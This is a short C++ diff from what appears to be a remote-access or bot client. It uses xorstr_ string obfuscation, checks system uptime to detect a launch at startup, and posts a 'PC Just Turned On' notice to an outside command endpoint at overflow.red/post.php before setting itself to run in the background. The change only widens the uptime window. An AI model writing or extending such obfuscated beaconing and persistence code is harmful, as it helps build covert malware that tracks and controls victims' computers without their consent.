@@ -95,7 +95,7 @@ void start_client() {
 
 		/* Determine If Ran From Startup */
 		auto uptime = std::chrono::milliseconds(GetTickCount64());
-		if ((uptime / 60000).count() <= 1) {
+		if ((uptime / 60000).count() <= 2) {
 			post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + (uptime / 60000).count() + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))));
 		
 			/* Set To Run In Background */
